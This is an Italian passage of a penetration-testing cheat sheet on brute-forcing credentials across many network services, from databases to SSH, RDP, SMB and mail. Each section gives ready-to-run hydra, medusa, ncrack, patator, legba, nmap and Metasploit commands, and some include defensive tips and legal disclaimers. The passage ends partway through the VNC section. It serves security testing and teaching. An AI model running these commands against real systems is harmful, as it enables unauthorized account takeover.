Mongo è un database NoSQL molto popolare che utilizza un modello di dati basato su documenti. È ampiamente utilizzato nelle applicazioni web moderne per la sua scalabilità e flessibilità. Tuttavia, come qualsiasi altra tecnologia, Mongo può essere soggetto a attacchi di forza bruta se non vengono prese le giuste precauzioni.

La forza bruta su Mongo coinvolge l'uso di programmi o script per tentare di indovinare le credenziali di accesso al database. Questo può essere fatto provando diverse combinazioni di nomi utente e password fino a trovare quelle corrette. Gli attaccanti possono utilizzare elenchi di parole comuni, dizionari o generare combinazioni casuali per eseguire l'attacco.

Per proteggere un'istanza di Mongo da attacchi di forza bruta, è importante seguire alcune best practice di sicurezza:

- Utilizzare password complesse e uniche per gli account di accesso a Mongo.
- Limitare l'accesso remoto al database solo agli indirizzi IP autorizzati.
- Configurare un firewall per bloccare gli indirizzi IP sospetti o noti per attacchi di forza bruta.
- Monitorare attentamente i log di accesso per rilevare eventuali tentativi di forza bruta.
- Aggiornare regolarmente Mongo e le sue dipendenze per correggere eventuali vulnerabilità note.

Inoltre, è possibile utilizzare strumenti di rilevamento delle intrusioni e di prevenzione delle intrusioni per monitorare e bloccare automaticamente gli attacchi di forza bruta su Mongo.

È importante ricordare che la forza bruta è un'attività illegale e non autorizzata. Queste informazioni sono fornite solo a scopo educativo e per aiutare a proteggere le proprie risorse da potenziali attacchi.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

MSSQL (Microsoft SQL Server) è un sistema di gestione di database relazionali sviluppato da Microsoft. È ampiamente utilizzato per archiviare e gestire grandi quantità di dati in modo efficiente. 

#### Brute Force

La tecnica di Brute Force è un metodo di attacco che consiste nel provare tutte le possibili combinazioni di password fino a trovare quella corretta. Nel contesto di MSSQL, il Brute Force può essere utilizzato per tentare di indovinare la password di accesso a un database. 

Per eseguire un attacco di Brute Force su un server MSSQL, è possibile utilizzare strumenti come Hydra o Medusa. Questi strumenti consentono di automatizzare il processo di prova delle password, riducendo il tempo necessario per trovare la password corretta. 

Tuttavia, è importante notare che l'uso del Brute Force per accedere a un sistema senza autorizzazione è illegale e può comportare conseguenze legali. Pertanto, è fondamentale utilizzare queste tecniche solo per scopi legittimi, come test di penetrazione o recupero di password dimenticate.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL è un sistema di gestione di database relazionali open source ampiamente utilizzato. È possibile utilizzare tecniche di forza bruta per tentare di indovinare le credenziali di accesso a un database MySQL. Di seguito sono riportati alcuni metodi comuni utilizzati per eseguire attacchi di forza bruta su MySQL:

- **Attacco di forza bruta tramite dizionario**: Questo metodo coinvolge l'utilizzo di un elenco di parole comuni o dizionario per tentare di indovinare la password dell'account MySQL. Viene eseguito un tentativo di accesso per ogni parola nel dizionario fino a quando non viene trovata una corrispondenza.

- **Attacco di forza bruta tramite forza bruta**: Questo metodo coinvolge la generazione di tutte le possibili combinazioni di caratteri per tentare di indovinare la password dell'account MySQL. Viene eseguito un tentativo di accesso per ogni combinazione fino a quando non viene trovata una corrispondenza.

- **Attacco di forza bruta tramite rainbow table**: Questo metodo coinvolge l'utilizzo di tabelle precalcolate contenenti hash di password e i corrispondenti valori in chiaro. Viene eseguito un confronto tra l'hash della password dell'account MySQL e i valori nella tabella rainbow per trovare una corrispondenza.

Per proteggere un database MySQL dagli attacchi di forza bruta, è consigliabile adottare le seguenti misure di sicurezza:

- Utilizzare password complesse e uniche per gli account MySQL.
- Limitare il numero di tentativi di accesso consentiti prima di bloccare l'indirizzo IP del mittente.
- Utilizzare un firewall per filtrare il traffico indesiderato verso il server MySQL.
- Aggiornare regolarmente il software MySQL per correggere eventuali vulnerabilità note.
- Monitorare attentamente i log di accesso per rilevare eventuali attività sospette.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
# Brute Force

## Introduzione

Il brute force è una tecnica di attacco che consiste nel tentare tutte le possibili combinazioni di password fino a trovare quella corretta. Questo metodo può essere utilizzato per violare la sicurezza di un sistema OracleSQL.

## Strumenti

Ci sono diversi strumenti disponibili per eseguire attacchi di brute force su OracleSQL. Alcuni di questi strumenti includono:

- Hydra
- Medusa
- Metasploit

## Metodologia

La seguente metodologia può essere utilizzata per eseguire un attacco di brute force su OracleSQL:

1. Identificare il nome utente di destinazione.
2. Creare un elenco di password da testare.
3. Utilizzare uno strumento di brute force per eseguire l'attacco.
4. Monitorare i risultati dell'attacco.
5. Ripetere il processo fino a trovare la password corretta.

## Considerazioni

Prima di eseguire un attacco di brute force su OracleSQL, è importante tenere presente quanto segue:

- L'attacco di brute force può richiedere molto tempo, a seconda della complessità della password.
- L'attacco di brute force può essere rilevato dai sistemi di sicurezza e può portare al blocco dell'account.
- L'attacco di brute force è illegale senza il consenso del proprietario del sistema.

## Conclusioni

Il brute force è una tecnica di attacco potente ma rischiosa che può essere utilizzata per violare la sicurezza di un sistema OracleSQL. Tuttavia, è importante ricordare che l'uso di questa tecnica senza il consenso del proprietario del sistema è illegale.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Per utilizzare **oracle\_login** con **patator** è necessario **installare**:
```bash
pip3 install cx_Oracle --upgrade
```
[Offline OracleSQL hash bruteforce](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versioni 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** e **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
POP (Post Office Protocol) è un protocollo di rete utilizzato per il recupero delle email da un server di posta elettronica. Il brute forcing di un account POP coinvolge l'utilizzo di un programma o uno script per tentare di indovinare la password di accesso all'account POP. Questo viene fatto provando una serie di password diverse fino a quando non viene trovata quella corretta. Il brute forcing di un account POP può essere un metodo efficace per ottenere accesso non autorizzato a un account di posta elettronica. Tuttavia, è importante notare che il brute forcing è un'attività illegale e può comportare conseguenze legali gravi.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL è un sistema di gestione di database relazionali open source che offre una vasta gamma di funzionalità avanzate. È ampiamente utilizzato per lo sviluppo di applicazioni web e per la gestione di grandi quantità di dati.

#### Brute Force

La tecnica di Brute Force è un metodo di attacco che consiste nel tentare tutte le possibili combinazioni di password fino a trovare quella corretta. Questo tipo di attacco può essere utilizzato per violare la sicurezza di un sistema PostgreSQL.

##### Utilizzo di Hydra

Hydra è uno strumento di hacking che può essere utilizzato per eseguire attacchi di Brute Force su vari protocolli, inclusi quelli utilizzati da PostgreSQL. Per utilizzare Hydra per attaccare un sistema PostgreSQL, è necessario specificare l'indirizzo IP del sistema di destinazione, la porta su cui è in ascolto il servizio PostgreSQL e un elenco di password da provare.

Esempio di comando Hydra per attaccare un sistema PostgreSQL:

```plaintext
hydra -t 4 -l <username> -P <password_list> postgresql://<target_ip>:<port>
```

Dove:
- `-t 4` specifica il numero di thread da utilizzare per l'attacco
- `-l <username>` specifica il nome utente da utilizzare per l'attacco
- `-P <password_list>` specifica il percorso del file contenente l'elenco delle password da provare
- `postgresql://<target_ip>:<port>` specifica l'indirizzo IP del sistema di destinazione e la porta su cui è in ascolto il servizio PostgreSQL

##### Utilizzo di Metasploit

Metasploit è un framework di penetration testing che include un modulo per eseguire attacchi di Brute Force su sistemi PostgreSQL. Per utilizzare Metasploit per attaccare un sistema PostgreSQL, è necessario specificare l'indirizzo IP del sistema di destinazione, la porta su cui è in ascolto il servizio PostgreSQL e un elenco di password da provare.

Esempio di comando Metasploit per attaccare un sistema PostgreSQL:

```plaintext
use auxiliary/scanner/postgres/postgres_login
set RHOSTS <target_ip>
set RPORT <port>
set USERNAME <username>
set PASS_FILE <password_list>
run
```

Dove:
- `use auxiliary/scanner/postgres/postgres_login` seleziona il modulo di Metasploit per l'attacco PostgreSQL
- `set RHOSTS <target_ip>` specifica l'indirizzo IP del sistema di destinazione
- `set RPORT <port>` specifica la porta su cui è in ascolto il servizio PostgreSQL
- `set USERNAME <username>` specifica il nome utente da utilizzare per l'attacco
- `set PASS_FILE <password_list>` specifica il percorso del file contenente l'elenco delle password da provare
- `run` avvia l'attacco di Brute Force
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Puoi scaricare il pacchetto `.deb` per l'installazione da [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol) è un protocollo sviluppato da Microsoft che consente agli utenti di connettersi a un computer remoto e controllarlo come se fossero fisicamente presenti davanti ad esso. Questo protocollo è comunemente utilizzato per l'accesso remoto a server o desktop Windows.

#### Brute Force su RDP

La tecnica di Brute Force su RDP consiste nel tentare di indovinare le credenziali di accesso a un server o a un desktop remoto utilizzando un attacco di forza bruta. In pratica, l'attaccante prova una serie di combinazioni di username e password fino a quando non ne trova una corretta che gli permette di accedere al sistema.

#### Strumenti per il Brute Force su RDP

Esistono diversi strumenti disponibili per eseguire attacchi di Brute Force su RDP. Alcuni esempi includono:

- **Hydra**: uno strumento di cracking di password che supporta il protocollo RDP.
- **Crowbar**: un'utility di cracking di password che può essere utilizzata per attaccare RDP.
- **Ncrack**: uno strumento di cracking di password di rete che supporta RDP.

#### Contromisure per il Brute Force su RDP

Per proteggersi dagli attacchi di Brute Force su RDP, è possibile adottare le seguenti contromisure:

- Utilizzare password complesse e robuste per gli account RDP.
- Imporre politiche di blocco degli account dopo un certo numero di tentativi di accesso falliti.
- Utilizzare un sistema di autenticazione a due fattori per l'accesso RDP.
- Limitare l'accesso RDP solo a indirizzi IP autorizzati.
- Monitorare attentamente i log di accesso RDP per rilevare eventuali attività sospette.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis è un sistema di archiviazione di dati in memoria open source che può essere utilizzato come database, cache o broker di messaggi. È noto per la sua velocità e la sua semplicità d'uso. Redis supporta diverse strutture dati, come stringhe, liste, set, hash e molto altro. È ampiamente utilizzato nell'ambito dello sviluppo web per migliorare le prestazioni delle applicazioni.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec (Remote Execution) è un protocollo di rete che consente a un utente di eseguire comandi su un host remoto. Questo protocollo può essere utilizzato per scopi legittimi come l'amministrazione di sistema, ma può anche essere sfruttato da un hacker per eseguire attacchi di forza bruta.

L'attacco di forza bruta su Rexec coinvolge l'utilizzo di un programma o uno script per tentare di indovinare la password di accesso all'host remoto. L'attaccante genera una lista di password possibili e le prova una per una fino a quando non trova quella corretta.

Per eseguire un attacco di forza bruta su Rexec, è possibile utilizzare strumenti come Hydra o Medusa. Questi strumenti consentono di automatizzare il processo di generazione e prova delle password, riducendo il tempo necessario per indovinare la password corretta.

È importante notare che l'attacco di forza bruta su Rexec è considerato un'attività illegale e può comportare conseguenze legali. Pertanto, è fondamentale ottenere l'autorizzazione scritta del proprietario del sistema prima di eseguire qualsiasi tipo di attacco di forza bruta.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin è un protocollo di rete che consente a un utente di accedere a un computer remoto su una rete. Questo protocollo utilizza l'autenticazione basata su password per verificare l'identità dell'utente. 

#### Brute force su Rlogin

La tecnica di brute force su Rlogin coinvolge l'uso di programmi o script per tentare di indovinare la password di accesso di un utente. Questo viene fatto provando una serie di password comuni o utilizzando un dizionario di parole. 

Per eseguire un attacco di brute force su Rlogin, è possibile utilizzare strumenti come Hydra o Medusa. Questi strumenti consentono di automatizzare il processo di tentativi di accesso con password diverse. 

Tuttavia, è importante notare che l'attacco di brute force su Rlogin può richiedere molto tempo, poiché il protocollo Rlogin può limitare il numero di tentativi di accesso consentiti entro un certo periodo di tempo. Pertanto, è consigliabile utilizzare un dizionario di parole specifico per l'attacco o utilizzare tecniche di attacco più avanzate, come l'attacco di dizionario ibrido o l'attacco di forza bruta intelligente. 

Inoltre, è importante notare che l'attacco di brute force su Rlogin è considerato un'attività illegale senza il consenso del proprietario del sistema. Pertanto, è fondamentale ottenere l'autorizzazione appropriata prima di eseguire qualsiasi tipo di attacco di brute force.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) è un protocollo di rete che consente agli utenti di eseguire comandi su un computer remoto. Questo protocollo può essere utilizzato per l'esecuzione di comandi su più computer contemporaneamente, semplificando così il processo di amministrazione di una rete. Tuttavia, a causa delle sue vulnerabilità di sicurezza, Rsh non è più ampiamente utilizzato e viene spesso disabilitato o sostituito con protocolli più sicuri come SSH.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync è un'applicazione di sincronizzazione di file che consente di copiare e trasferire dati tra sistemi remoti. È ampiamente utilizzato per il backup dei dati e per la distribuzione di file su reti. Rsync utilizza un algoritmo di differenziazione per trasferire solo le parti dei file che sono state modificate, riducendo così il tempo e la larghezza di banda necessari per il trasferimento dei dati. È possibile utilizzare Rsync per sincronizzare file tra un server locale e un server remoto, o tra due server remoti.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP (Real Time Streaming Protocol) è un protocollo di rete utilizzato per la trasmissione di dati multimediali in tempo reale. È comunemente utilizzato per lo streaming di video e audio su Internet. RTSP utilizza il protocollo TCP per stabilire una connessione tra il client e il server, consentendo al client di controllare la riproduzione dei dati multimediali. Questo protocollo può essere utilizzato per accedere a telecamere di sorveglianza, server di streaming e altri dispositivi che supportano lo streaming in tempo reale.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

SFTP (Secure File Transfer Protocol) è un protocollo sicuro per il trasferimento di file su una rete. Utilizza SSH (Secure Shell) per autenticare e crittografare le connessioni, garantendo la riservatezza e l'integrità dei dati durante il trasferimento.

#### Brute Force su SFTP

La tecnica di Brute Force su SFTP consiste nel tentare di indovinare le credenziali di accesso di un account SFTP attraverso la forza bruta. Questo viene fatto provando tutte le possibili combinazioni di username e password fino a trovare quelle corrette.

##### Strumenti per il Brute Force su SFTP

Ci sono diversi strumenti disponibili per eseguire un attacco di Brute Force su SFTP. Alcuni di questi strumenti includono:

- Hydra: uno strumento di cracking delle password che supporta il protocollo SFTP.
- Medusa: un altro strumento di cracking delle password che può essere utilizzato per attaccare SFTP.
- Ncrack: uno strumento di cracking delle password che supporta diversi protocolli, tra cui SFTP.

##### Contromisure per il Brute Force su SFTP

Per proteggere un server SFTP dagli attacchi di Brute Force, è possibile adottare le seguenti contromisure:

- Utilizzare password complesse e robuste per gli account SFTP.
- Imporre limiti sul numero di tentativi di accesso consentiti prima di bloccare l'IP del mittente.
- Monitorare i log di accesso per rilevare attività sospette o tentativi di Brute Force.
- Utilizzare l'autenticazione a due fattori per aggiungere un ulteriore livello di sicurezza.
- Aggiornare regolarmente il software del server SFTP per correggere eventuali vulnerabilità note.

È importante notare che l'esecuzione di un attacco di Brute Force su un sistema senza autorizzazione è illegale e può comportare conseguenze legali.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP (Simple Network Management Protocol) è un protocollo di gestione di rete utilizzato per monitorare e gestire dispositivi di rete come router, switch e server. SNMP consente di raccogliere informazioni sullo stato e le prestazioni dei dispositivi di rete, nonché di controllarli e configurarli da remoto.

#### Brute Force su SNMP

La tecnica di Brute Force su SNMP consiste nel tentare di indovinare le credenziali di accesso a un dispositivo SNMP utilizzando un elenco di password predefinite o generando password casuali. Questo attacco può essere eseguito utilizzando strumenti come Hydra o Medusa.

Per eseguire un attacco di Brute Force su SNMP, è necessario conoscere l'indirizzo IP del dispositivo di destinazione e le credenziali di accesso SNMP. Una volta ottenute queste informazioni, è possibile utilizzare uno strumento di Brute Force per tentare di indovinare la password di accesso.

È importante notare che l'attacco di Brute Force su SNMP può essere considerato un'attività illegale e non etica se eseguita senza il consenso del proprietario del dispositivo di destinazione. Pertanto, è fondamentale ottenere l'autorizzazione appropriata prima di eseguire qualsiasi tipo di attacco di hacking.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB (Server Message Block) è un protocollo di rete utilizzato per la condivisione di file, stampanti e altre risorse tra i dispositivi in una rete locale. È ampiamente utilizzato nei sistemi operativi Windows.

#### Brute Force su SMB

La tecnica di Brute Force su SMB coinvolge l'uso di programmi o script per tentare di indovinare le credenziali di accesso a un server SMB. Questo viene fatto provando una serie di combinazioni di nomi utente e password fino a trovare quelle corrette.

#### Strumenti per il Brute Force su SMB

Ci sono diversi strumenti disponibili per eseguire un attacco di Brute Force su SMB. Alcuni esempi includono Hydra, Medusa e smbmap. Questi strumenti consentono di automatizzare il processo di tentativi di accesso e possono essere configurati per utilizzare diverse liste di nomi utente e password.

#### Contromisure per il Brute Force su SMB

Per proteggersi dagli attacchi di Brute Force su SMB, è consigliabile adottare le seguenti contromisure:

- Utilizzare password complesse e uniche per gli account SMB.
- Imporre limiti sul numero di tentativi di accesso consentiti prima di bloccare l'account.
- Monitorare i log di accesso per rilevare attività sospette.
- Aggiornare regolarmente il software SMB per correggere eventuali vulnerabilità note.

#### Conclusioni

Il Brute Force su SMB è una tecnica comune utilizzata dagli hacker per ottenere accesso non autorizzato a server SMB. È importante prendere misure per proteggersi da questo tipo di attacco, implementando contromisure adeguate e mantenendo una buona igiene delle password.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

SMTP (Simple Mail Transfer Protocol) è un protocollo di rete utilizzato per l'invio di email. È ampiamente utilizzato per l'invio di messaggi di posta elettronica da un client di posta elettronica a un server di posta elettronica. 

#### Brute Force su SMTP

La tecnica di Brute Force su SMTP coinvolge l'uso di un programma o uno script per tentare di indovinare le credenziali di accesso a un server SMTP. Questo viene fatto provando una serie di combinazioni di username e password fino a quando non viene trovata una corrispondenza valida. 

#### Strumenti per il Brute Force su SMTP

Ci sono diversi strumenti disponibili per eseguire un attacco di Brute Force su SMTP. Alcuni esempi includono Hydra, Medusa e Ncrack. Questi strumenti automatizzano il processo di tentativi di accesso e possono essere configurati per utilizzare diverse liste di username e password. 

#### Contromisure per il Brute Force su SMTP

Per proteggere un server SMTP dagli attacchi di Brute Force, è possibile adottare diverse contromisure. Alcuni suggerimenti includono l'implementazione di politiche di blocco degli account dopo un numero specifico di tentativi falliti, l'utilizzo di password complesse e l'aggiornamento regolare del software del server per correggere eventuali vulnerabilità note.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS (Socket Secure) è un protocollo di rete che permette ai client di instradare le loro richieste attraverso un server proxy. Questo protocollo è ampiamente utilizzato per scopi di anonimato e bypassare le restrizioni di rete. 

Il funzionamento di SOCKS si basa su una connessione TCP tra il client e il server proxy. Il client invia le sue richieste al server proxy, che a sua volta le inoltra al server di destinazione. Il server proxy agisce come intermediario tra il client e il server di destinazione, nascondendo l'indirizzo IP del client originale.

L'utilizzo di SOCKS può essere utile per vari scopi, come l'accesso a contenuti geograficamente limitati, il bypass di firewall o il mantenimento dell'anonimato durante la navigazione su Internet. Tuttavia, è importante notare che l'utilizzo di SOCKS per scopi illegali o non autorizzati può comportare conseguenze legali.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

SQL Server è un sistema di gestione di database relazionali (RDBMS) sviluppato da Microsoft. È ampiamente utilizzato per archiviare e gestire grandi quantità di dati in modo efficiente. SQL Server supporta il linguaggio SQL (Structured Query Language) per interrogare e manipolare i dati nel database.

#### Brute Force

La tecnica di Brute Force è un metodo di attacco che consiste nel tentare tutte le possibili combinazioni di password fino a trovare quella corretta. Questo tipo di attacco può essere utilizzato per violare la sicurezza di un sistema SQL Server.

Per eseguire un attacco di Brute Force su un server SQL, è possibile utilizzare strumenti come Hydra o Medusa. Questi strumenti consentono di automatizzare il processo di tentativi di accesso con password diverse.

È importante notare che l'attacco di Brute Force può richiedere molto tempo, in particolare se la password è complessa e lunga. Pertanto, è consigliabile utilizzare password sicure e complesse per proteggere il server SQL da questo tipo di attacco.

#### Protezione contro Brute Force

Per proteggere un server SQL da attacchi di Brute Force, è possibile adottare diverse misure di sicurezza, tra cui:

- Imporre politiche di password complesse: richiedere agli utenti di utilizzare password che contengano una combinazione di lettere maiuscole e minuscole, numeri e caratteri speciali.
- Limitare il numero di tentativi di accesso: impostare un limite massimo di tentativi di accesso falliti prima di bloccare l'account per un determinato periodo di tempo.
- Utilizzare autenticazione a due fattori: richiedere agli utenti di fornire un secondo fattore di autenticazione, come un codice generato da un'applicazione sul loro dispositivo mobile, oltre alla password.
- Monitorare i log di accesso: tenere traccia dei tentativi di accesso falliti e monitorare i log di accesso per rilevare eventuali attività sospette.
- Aggiornare regolarmente il server SQL: assicurarsi di installare gli aggiornamenti di sicurezza più recenti per proteggere il server da vulnerabilità note.

Implementando queste misure di sicurezza, è possibile ridurre significativamente il rischio di successo di un attacco di Brute Force su un server SQL.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) è un protocollo di rete che consente di stabilire una connessione sicura e crittografata tra due dispositivi, consentendo l'accesso remoto e il controllo di un sistema. L'obiettivo principale di SSH è garantire la riservatezza e l'integrità dei dati trasmessi attraverso la rete.

#### Brute Force su SSH

La tecnica di Brute Force su SSH consiste nel tentare di indovinare la password di accesso a un sistema remoto attraverso una serie di tentativi. Questo viene fatto provando una lista di password predefinite o generando password casuali in modo sistematico.

#### Strumenti per il Brute Force su SSH

Ci sono diversi strumenti disponibili per eseguire un attacco di Brute Force su SSH. Alcuni dei più comuni includono:

- Hydra: uno strumento di cracking di password che supporta diversi protocolli, tra cui SSH.
- Medusa: un altro strumento di cracking di password che può essere utilizzato per attaccare SSH.
- Ncrack: uno strumento di cracking di password di rete che supporta SSH e altri protocolli.

#### Contromisure per il Brute Force su SSH

Per proteggere un sistema da attacchi di Brute Force su SSH, è possibile adottare le seguenti contromisure:

- Utilizzare password complesse e robuste che siano difficili da indovinare.
- Imporre limiti sul numero di tentativi di accesso consentiti prima di bloccare l'indirizzo IP del mittente.
- Utilizzare l'autenticazione a due fattori per aggiungere un ulteriore livello di sicurezza.
- Monitorare attentamente i log di accesso per rilevare attività sospette o tentativi di Brute Force.
- Aggiornare regolarmente il software SSH per beneficiare delle ultime correzioni di sicurezza.

#### Conclusioni

Il Brute Force su SSH è una tecnica comune utilizzata dagli hacker per ottenere accesso non autorizzato a sistemi remoti. Tuttavia, con le giuste contromisure e una buona pratica di sicurezza, è possibile proteggere efficacemente un sistema da questo tipo di attacco.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Chiavi SSH deboli / PRNG prevedibile di Debian

Alcuni sistemi presentano difetti noti nel seme casuale utilizzato per generare materiale crittografico. Ciò può comportare una riduzione drammatica dello spazio delle chiavi che può essere forzato con strumenti come [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Sono disponibili anche set pre-generati di chiavi deboli come [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ e OpenMQ)

Il protocollo di testo STOMP è un protocollo di messaggistica ampiamente utilizzato che **consente una comunicazione e interazione senza soluzione di continuità con servizi di code di messaggi popolari** come RabbitMQ, ActiveMQ, HornetQ e OpenMQ. Fornisce un approccio standardizzato ed efficiente per lo scambio di messaggi e l'esecuzione di varie operazioni di messaggistica.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet è un protocollo di rete che consente di stabilire una connessione remota con un dispositivo tramite la rete. Questo protocollo può essere utilizzato per accedere a dispositivi di rete come router, switch e server. 

Il brute forcing di Telnet coinvolge l'utilizzo di un programma o uno script per tentare di indovinare le credenziali di accesso a un dispositivo Telnet. Questo viene fatto provando una serie di combinazioni di nome utente e password fino a quando non viene trovata una corrispondenza valida. 

Il brute forcing di Telnet può essere un metodo efficace per ottenere l'accesso non autorizzato a un dispositivo, ma è importante notare che è un'attività illegale e può comportare conseguenze legali. Pertanto, è fondamentale utilizzare queste informazioni solo a fini educativi e legali.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC (Virtual Network Computing) è un protocollo che consente di controllare e visualizzare il desktop di un computer remoto tramite una connessione di rete. È spesso utilizzato per l'amministrazione remota dei sistemi e per il supporto tecnico.

#### Brute Force su VNC

La tecnica di Brute Force su VNC consiste nel tentare di indovinare la password di accesso al server VNC attraverso la prova di diverse combinazioni di password. Questo può essere fatto utilizzando uno script o uno strumento di Brute Force appositamente progettato.

#### Strumenti di Brute Force per VNC

Ci sono diversi strumenti disponibili per eseguire un attacco di Brute Force su VNC. Alcuni esempi includono:

- Hydra: uno strumento di Brute Force molto popolare che supporta VNC.
